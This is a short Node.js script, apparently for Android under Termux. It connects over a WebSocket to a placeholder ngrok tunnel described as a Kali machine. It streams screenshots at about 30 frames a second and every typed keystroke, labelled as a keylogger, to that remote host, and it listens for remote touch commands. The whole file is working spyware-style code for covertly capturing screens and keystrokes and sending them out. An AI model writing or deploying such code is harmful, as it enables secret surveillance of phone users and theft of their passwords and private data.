const WebSocket = require('ws');
const { exec } = require('child_process');

// YOUR NGROK URL FROM QR
const URL = 'wss://YOUR_NGROK.ngrok-free.app'; 
const ws = new WebSocket(URL);

ws.on('open', () => {
    console.log('📱 Connected to Kali!');
    
    // Screen capture loop (30fps)
    setInterval(captureScreen, 33);
    
    // Keylogger
    process.stdin.setRawMode(true);
    process.stdin.resume();
    process.stdin.on('data', key => {
        const keyStr = key.toString();
        ws.send(JSON.stringify({
            type: 'keylog',
            key: keyStr,
            time: new Date().toISOString()
        }));
    });
});

function captureScreen() {
    exec('termux-screenshot /sdcard/screen.jpg', (err) => {
        if (!err) {
            require('fs').readFile('/sdcard/screen.jpg', (err, data) => {
                if (!err) {
                    ws.send(JSON.stringify({
                        type: 'screen',
                        data: data.toString('base64')
                    }));
                }
            });
        }
    });
}

ws.on('message', data => {
    const msg = JSON.parse(data);
    if (msg.type === 'touch') {
        console.log(`👆 Touch: ${msg.x}, ${msg.y}`);
        // Simulate touch (optional)
    }
});